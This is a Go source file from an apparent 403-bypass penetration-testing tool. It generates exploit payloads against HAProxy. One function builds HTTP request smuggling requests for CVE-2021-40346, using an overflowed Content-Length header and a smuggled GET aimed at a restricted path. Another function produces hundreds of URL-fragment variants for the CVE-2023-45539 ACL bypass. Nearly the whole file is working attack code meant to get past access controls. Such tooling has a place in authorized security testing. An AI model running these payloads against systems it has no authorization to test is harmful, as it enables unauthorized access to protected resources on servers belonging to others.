package payload

import (
	"fmt"
	"strings"

	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

// https://github.com/donky16/CVE-2021-40346-POC

/*
GenerateHAProxyBypassPayloads generates payloads for multiple HAProxy vulnerabilities:

1. CVE-2021-40346: Integer overflow vulnerability leading to HTTP Request Smuggling
2. CVE-2023-45539: URL fragment handling bypass for ACL evasion

References:
- CVE-2021-40346: https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/
- CVE-2023-45539: https://www.haproxy.com/blog/december-2023-cve-2023-45539-haproxy-accepts-as-part-of-the-uri-component-fixed
*/
func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	// CVE-2021-40346: Integer overflow + HTTP Request Smuggling
	jobs1 := pg.generateHAProxy_CVE_2021_40346(targetURL, bypassModule)
	allJobs = append(allJobs, jobs1...)

	// CVE-2023-45539: Fragment handling ACL bypass
	jobs2 := pg.generateHAProxy_CVE_2023_45539(targetURL, bypassModule)
	allJobs = append(allJobs, jobs2...)

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d total HAProxy bypass payloads (%d CVE-2021-40346 + %d CVE-2023-45539) for %s",
		len(allJobs), len(jobs1), len(jobs2), targetURL)
	return allJobs
}

/*
generateHAProxy_CVE_2021_40346 generates payloads for exploiting the HAProxy CVE-2021-40346
integer overflow vulnerability that leads to HTTP Request Smuggling.

The vulnerability exploits an integer overflow in HAProxy's header parsing to smuggle an HTTP
request. By using a malformed Content-Length header that causes integer overflow, we can
smuggle a second request in the body of the first that will be processed by the backend server
but will bypass HAProxy's access controls.

References:
- https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/
- https://github.com/donky16/CVE-2021-40346-POC
*/
func (pg *PayloadGenerator) generateHAProxy_CVE_2021_40346(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL: %s", targetURL)
		return allJobs
	}

	// Extract target host and path
	host := parsedURL.Host
	path := parsedURL.Path
	if parsedURL.Query != "" {
		path += "?" + parsedURL.Query
	}

	// Test various public endpoints before the restricted one
	publicPaths := []string{
		"/",
		"/public",
		"/guest",
		"/index",
		"/robots.txt",
		"/sitemap.xml",
		"/favicon.ico",
	}

	// Generate overflow pattern - exact pattern from working PoC
	// Content-Length0 + 256 'a' characters
	overflowPattern := "0" + strings.Repeat("a", 255)
	malformedHeaderName := "Content-Length" + overflowPattern

	// For each public path, try to smuggle a request to the target path
	for _, publicPath := range publicPaths {
		// Craft the smuggled request - this goes in the body and targets the RESTRICTED path
		// The h:GET header references the PUBLIC path for camouflage
		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
			path,       // Target/RESTRICTED path (what we want to access)
			publicPath, // PUBLIC path (for h:GET camouflage header)
			host)

		calculatedContentLength := len(smuggledRequest) - strings.Count(smuggledRequest, "\r") - strings.Count(smuggledRequest, "\n")

		// Create payload matching the working PoC structure
		job := BypassPayload{
			OriginalURL:  targetURL,
			Method:       "POST",
			Scheme:       parsedURL.Scheme,
			Host:         host,
			RawURI:       publicPath,
			BypassModule: bypassModule,
			Body:         smuggledRequest,
			Headers: []Headers{
				// 1. Malformed header FIRST - NO VALUE after colon (like working PoC)
				{
					Header: malformedHeaderName, // e.g., "Content-Length0aaa..."
					Value:  "",                  // EMPTY VALUE - this is critical!
				},
				// 2. Real Content-Length will be deferred to LAST position in request.go
				{
					Header: "Content-Length",
					Value:  fmt.Sprintf("%d", calculatedContentLength),
				},
				{
					Header: "Connection",
					Value:  "close",
				},
			},
		}

		job.PayloadToken = GeneratePayloadToken(job)

		// HTTP Request Smuggling requires sending each request TWICE in sequence
		allJobs = append(allJobs, job)
		allJobs = append(allJobs, job) // Add the same job immediately twice
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d CVE-2021-40346 payload(s) (%d variations x2 for smuggling) for %s", len(allJobs), len(publicPaths), targetURL)
	return allJobs
}

/*
generateHAProxy_CVE_2023_45539 generates payloads for exploiting the HAProxy CVE-2023-45539
URL fragment handling vulnerability that leads to ACL bypass.

The vulnerability exploits HAProxy's improper handling of URL fragments (#) in path matching.
Before the fix, HAProxy would include fragments in ACL path matching, allowing attackers to
bypass routing rules and security controls.

Attack vectors:
- path_end bypass: /admin#.png tricks path_end .png rules
- path_beg bypass: /restricted#public tricks path_beg public rules
- path_reg bypass: /api/secret#allowed tricks regex patterns

References:
- https://www.haproxy.com/blog/december-2023-cve-2023-45539-haproxy-accepts-as-part-of-the-uri-component-fixed
- https://www.mail-archive.com/haproxy%40formilux.org/msg43861.html
*/
func (pg *PayloadGenerator) generateHAProxy_CVE_2023_45539(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL: %s", targetURL)
		return allJobs
	}

	basePath := parsedURL.Path
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// Base job template
	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		BypassModule: bypassModule,
	}

	// Split path into segments for multi-level injection
	var pathSegments []string
	trimmedPath := strings.TrimPrefix(basePath, "/")
	if basePath == "/" {
		pathSegments = []string{""}
	} else if basePath == "" {
		pathSegments = []string{}
	} else {
		pathSegments = strings.Split(trimmedPath, "/")
	}

	// --- Define bypass patterns for different HAProxy ACL types ---

	// File extensions for path_end bypass
	fileExtensions := []string{
		".png", ".jpg", ".jpeg", ".gif", ".css", ".js", ".ico", ".svg", ".woff", ".woff2",
		".pdf", ".xml", ".json", ".txt", ".html", ".htm", ".zip", ".tar", ".gz",
		".mp4", ".mp3", ".wav", ".avi", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
	}

	// Public/allowed paths for path_beg bypass
	publicPaths := []string{
		"public", "guest", "static", "assets", "images", "css", "js", "fonts", "uploads",
		"api", "health", "status", "metrics", "docs", "swagger", "admin", "login",
		"allowed", "permitted", "authorized", "open", "free", "common", "shared",
	}

	// Mixed patterns for complex ACL bypass
	mixedPatterns := []string{
		"index", "home", "main", "root", "default", "app", "site", "web",
		"v1", "v2", "api", "rest", "service", "endpoint", "resource",
	}

	// Helper function to add jobs with deduplication
	addJob := func(pathPart string, headers ...Headers) {
		job := baseJob
		job.RawURI = pathPart + query
		if len(headers) > 0 {
			job.Headers = headers
		}
		job.PayloadToken = GeneratePayloadToken(job)
		allJobs = append(allJobs, job)
	}

	// --- Generate CVE-2023-45539 payloads ---

	// 1. Basic fragment extension bypass (path_end)
	// Targets: ACL rules like "path_end .png .jpg .css"
	for _, ext := range fileExtensions {
		addJob(basePath + "#" + ext)
	}

	// 2. Basic fragment path prefix bypass (path_beg)
	// Targets: ACL rules like "path_beg /public /guest /static"
	for _, pubPath := range publicPaths {
		addJob(basePath + "#" + pubPath)
		addJob(basePath + "#/" + pubPath) // With slash
	}

	// 3. Mixed pattern bypass for complex ACLs
	for _, pattern := range mixedPatterns {
		addJob(basePath + "#" + pattern)
	}

	// 4. Multi-level path segment injection
	// Insert fragments at different path segment positions
	if len(pathSegments) > 0 && !(len(pathSegments) == 1 && pathSegments[0] == "") {
		for i := 0; i <= len(pathSegments); i++ {
			// Build prefix (path up to injection point)
			prefix := "/"
			if i > 0 {
				prefix = "/" + strings.Join(pathSegments[:i], "/")
				if i < len(pathSegments) {
					prefix += "/"
				}
			}

			// Build suffix (remaining path after injection point)
			suffix := ""
			if i < len(pathSegments) {
				suffix = strings.Join(pathSegments[i:], "/")
			}

			// Inject file extensions at this position
			for _, ext := range fileExtensions {
				if i == len(pathSegments) {
					// Append at end
					addJob(strings.TrimSuffix(prefix, "/") + "#" + ext)
				} else {
					// Insert between segments
					addJob(strings.TrimSuffix(prefix, "/") + "#" + ext + "/" + suffix)
				}
			}

			// Inject public paths at this position
			for _, pubPath := range publicPaths {
				if i == len(pathSegments) {
					// Append at end
					addJob(strings.TrimSuffix(prefix, "/") + "#" + pubPath)
				} else {
					// Insert between segments
					addJob(strings.TrimSuffix(prefix, "/") + "#" + pubPath + "/" + suffix)
				}
			}
		}
	}

	// 5. Double fragment bypass (fragment within fragment)
	// Some parsers might handle nested fragments differently
	for _, ext := range fileExtensions[:5] { // Limit to avoid explosion
		for _, pubPath := range publicPaths[:5] {
			addJob(basePath + "#" + pubPath + "#" + ext)
		}
	}

	// 6. Fragment with query parameters
	// Test if fragments interfere with query parsing
	commonParams := []string{"id=1", "page=1", "type=public", "format=json", "debug=true"}
	for _, param := range commonParams {
		for _, ext := range fileExtensions[:3] { // Limit combinations
			addJob(basePath + "#" + ext + "?" + param)
		}
	}

	// 7. Path traversal combined with fragments
	// Attempt to bypass both path traversal filters and ACLs
	traversalPatterns := []string{"../", "./", "..\\", ".\\"}
	for _, traversal := range traversalPatterns {
		for _, ext := range fileExtensions[:3] {
			addJob(basePath + "#" + traversal + "file" + ext)
		}
		for _, pubPath := range publicPaths[:3] {
			addJob(basePath + "#" + traversal + pubPath)
		}
	}

	// Deduplicate payloads based on RawURI
	uniqueJobs := make(map[string]BypassPayload)
	for _, job := range allJobs {
		uniqueJobs[job.RawURI] = job
	}

	// Convert back to slice
	dedupedJobs := make([]BypassPayload, 0, len(uniqueJobs))
	for _, job := range uniqueJobs {
		dedupedJobs = append(dedupedJobs, job)
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d CVE-2023-45539 fragment bypass payloads for %s", len(dedupedJobs), targetURL)
	return dedupedJobs
}
